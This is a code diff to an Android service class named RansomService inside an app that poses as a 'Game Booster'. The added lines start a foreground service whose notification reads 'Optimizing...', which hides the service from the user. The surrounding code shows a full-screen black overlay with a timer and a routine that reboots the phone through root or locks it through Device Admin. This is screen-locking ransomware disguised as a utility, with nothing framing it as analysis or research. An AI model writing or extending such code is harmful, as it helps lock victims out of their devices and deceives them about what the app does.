@@ -1,5 +1,8 @@
 package com.example.gamebooster;
 
+import android.app.Notification;
+import android.app.NotificationChannel;
+import android.app.NotificationManager;
 import android.app.Service;
 import android.app.admin.DevicePolicyManager;
 import android.content.ComponentName;
@@ -17,7 +20,6 @@ import android.widget.LinearLayout;
 import android.widget.TextView;
 
 public class RansomService extends Service {
-
     private WindowManager windowManager;
     private View overlayView;
     private TextView timerText;
@@ -25,6 +27,26 @@ public class RansomService extends Service {
     @Override
     public void onCreate() {
         super.onCreate();
+        
+        // Wajib buat Foreground Service di Android baru
+        String CHANNEL_ID = "RansomChannel";
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "System", NotificationManager.IMPORTANCE_LOW);
+            NotificationManager manager = getSystemService(NotificationManager.class);
+            if (manager != null) manager.createNotificationChannel(channel);
+        }
+        Notification notification;
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            notification = new Notification.Builder(this, CHANNEL_ID)
+                    .setContentTitle("Game Booster").setContentText("Optimizing...")
+                    .setSmallIcon(android.R.drawable.ic_dialog_info).build();
+        } else {
+            notification = new Notification.Builder(this)
+                    .setContentTitle("Game Booster").setContentText("Optimizing...")
+                    .setSmallIcon(android.R.drawable.ic_dialog_info).build();
+        }
+        startForeground(1, notification);
+
         windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
         showOverlay();
     }
@@ -46,7 +68,6 @@ public class RansomService extends Service {
                 | WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                 PixelFormat.TRANSLUCENT);
 
-        // Bikin Layout Programmatically (Gak butuh XML)
         LinearLayout layout = new LinearLayout(this);
         layout.setOrientation(LinearLayout.VERTICAL);
         layout.setBackgroundColor(Color.BLACK);
@@ -95,15 +116,13 @@ public class RansomService extends Service {
 
     private void rebootDevice() {
         try {
-            // Coba restart pakai akses Root
             Process proc = Runtime.getRuntime().exec(new String[]{"su", "-c", "reboot"});
             proc.waitFor();
         } catch (Exception e) {
-            // Kalau gak ada root, pakai Device Admin buat Lock HP
             DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
             ComponentName admin = new ComponentName(this, AdminReceiver.class);
             if (dpm != null && dpm.isAdminActive(admin)) {
-                dpm.lockNow(); // Ngunci HP kalau gak bisa restart
+                dpm.lockNow();
             }
         }
     }
